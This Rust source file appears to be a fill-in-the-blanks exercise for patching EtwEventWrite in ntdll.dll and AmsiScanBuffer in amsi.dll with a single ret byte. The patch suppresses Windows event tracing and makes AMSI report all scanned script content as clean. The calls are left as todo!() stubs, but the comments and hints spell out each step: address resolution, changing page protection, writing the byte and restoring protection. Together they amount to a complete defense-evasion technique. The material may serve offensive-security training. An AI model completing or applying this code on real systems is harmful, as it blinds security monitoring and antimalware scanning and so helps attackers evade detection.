use std::ffi::c_void;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
use windows::core::PCSTR;

fn main() {
    unsafe {
        // ---- Part 1: Patch EtwEventWrite in ntdll.dll ----

        // Step 1 — Get a handle to ntdll.dll.
        // It is always loaded in every Windows process — no LoadLibraryA needed.
        // GetModuleHandleA does NOT increment the reference count.
        //
        // Hint: GetModuleHandleA(
        //     lpmodulename: PCSTR,  // b"ntdll.dll\0"
        // ) -> Result<HMODULE>     // HMODULE wraps isize — it IS the base address
        let hntdll = todo!("GetModuleHandleA(b\"ntdll.dll\\0\")");
        println!("[*] ntdll.dll handle: {:?}", hntdll);

        // Step 2 — Resolve the address of EtwEventWrite.
        // GetProcAddress looks up the exported function by name and returns a raw
        // function pointer. We will treat this pointer as a *mut u8 to patch it.
        //
        // Hint: GetProcAddress(
        //     hmodule: HMODULE,    // hntdll
        //     lpprocname: PCSTR,   // b"EtwEventWrite\0"
        // ) -> Option<unsafe extern "system" fn() -> isize>
        //                          // Some if found; None if the export doesn't exist
        let etw_write_fn = todo!("GetProcAddress(hntdll, b\"EtwEventWrite\\0\")");
        let etw_write_ptr: *mut u8 = todo!(
            "transmute or cast the Option<fn> to *mut u8 — this is the first byte of the stub"
        );
        println!("[*] EtwEventWrite address: {:#x}", etw_write_ptr as usize);
        println!("[*] EtwEventWrite first byte (before patch): {:#x}", *etw_write_ptr);

        // Step 3 — Make the memory page writable, patch with 0xC3 (ret), restore protection.
        //
        // 0xC3 is the x64 RET instruction. After patching, EtwEventWrite immediately
        // returns to its caller without executing any logging or kernel transition.
        //
        // Step 3a — Change page protection to allow writes:
        // Hint: VirtualProtect(
        //     lpaddress: *const c_void,              // etw_write_ptr as *const c_void
        //     dwsize: usize,                         // 1 — we only need to write one byte
        //     flnewprotect: PAGE_PROTECTION_FLAGS,   // PAGE_EXECUTE_READWRITE
        //     lpfloldprotect: *mut PAGE_PROTECTION_FLAGS, // &mut old_protect — save for restore
        // ) -> Result<()>
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        todo!("VirtualProtect(etw_write_ptr, 1, PAGE_EXECUTE_READWRITE, &mut old_protect)");

        // Step 3b — Write the patch byte:
        // Hint: *etw_write_ptr = 0xC3u8;
        todo!("write 0xC3 to *etw_write_ptr");

        // Step 3c — Restore original protection:
        todo!("VirtualProtect(etw_write_ptr, 1, old_protect, &mut old_protect)");

        println!("[+] EtwEventWrite patched — first byte now: {:#x}", *etw_write_ptr);

        // ---- Part 2: Patch AmsiScanBuffer in amsi.dll ----

        // Step 4 — Load amsi.dll.
        // Unlike ntdll, amsi.dll is not loaded by default in every process.
        // LoadLibraryA loads it if not already present and returns a handle.
        //
        // Hint: LoadLibraryA(
        //     lplibfilename: PCSTR,  // b"amsi.dll\0"
        // ) -> Result<HMODULE>
        let hamsi = todo!("LoadLibraryA(b\"amsi.dll\\0\")");
        println!("[*] amsi.dll loaded at: {:?}", hamsi);

        // Step 5 — Resolve AmsiScanBuffer.
        //
        // Hint: GetProcAddress(
        //     hmodule: HMODULE,    // hamsi
        //     lpprocname: PCSTR,   // b"AmsiScanBuffer\0"
        // ) -> Option<unsafe extern "system" fn() -> isize>
        let amsi_scan_fn = todo!("GetProcAddress(hamsi, b\"AmsiScanBuffer\\0\")");
        let amsi_scan_ptr: *mut u8 = todo!("cast to *mut u8");
        println!("[*] AmsiScanBuffer address: {:#x}", amsi_scan_ptr as usize);
        println!("[*] AmsiScanBuffer first byte (before patch): {:#x}", *amsi_scan_ptr);

        // Step 6 — Patch AmsiScanBuffer with 0xC3 using the same three-step pattern.
        // AmsiScanBuffer is called before PowerShell and .NET execute script content.
        // Patching it makes AMSI report every scan as clean without inspecting the content.
        //
        // Use the same VirtualProtect → write → VirtualProtect pattern as steps 3a-3c.
        let mut old_protect2 = PAGE_PROTECTION_FLAGS(0);
        todo!("VirtualProtect → *amsi_scan_ptr = 0xC3 → VirtualProtect restore");

        println!("[+] AmsiScanBuffer patched — first byte now: {:#x}", *amsi_scan_ptr);

        // Step 7 — Demonstrate the ETW patch is live.
        // Call a Win32 API that would normally trigger ETW telemetry.
        // A simple VirtualAlloc + VirtualFree pair generates allocation events.
        // After patching EtwEventWrite with ret, these events are silently dropped
        // instead of being sent to ETW consumers.
        //
        // Hint: call VirtualAlloc (or any allocation API) and observe that the process
        // does not crash and the call succeeds — EtwEventWrite was invoked (transparently)
        // but returned immediately due to the patch.
        println!("[*] Exercising a memory allocation to trigger (suppressed) ETW events...");
        todo!(
            "VirtualAlloc(None, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) then VirtualFree"
        );
        println!("[+] Allocation succeeded — EtwEventWrite was called but silently returned");
        println!("[+] Both ETW and AMSI are now patched in this process");
    }
}
